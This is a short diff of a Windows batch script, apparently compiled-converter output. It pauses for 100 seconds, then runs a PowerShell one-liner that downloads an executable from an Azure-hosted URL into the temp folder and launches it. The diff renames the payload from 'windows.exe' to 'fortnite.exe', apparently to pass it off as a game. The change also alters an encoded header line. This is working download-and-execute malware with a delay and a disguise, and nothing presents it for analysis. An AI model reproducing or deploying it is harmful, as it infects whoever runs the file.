@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCuDJHqL+04jPA5SSkqHJG7a
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaNItcYLeybGNNfIa/lzYc5k/wnRTjM5CCQNdHg==
 ::YB416Ek+ZG8=
 ::
 ::
@@ -35,7 +35,7 @@
 
 timeout 100 >nul
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'http://mogiant.azurewebsites.net/fortnite.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
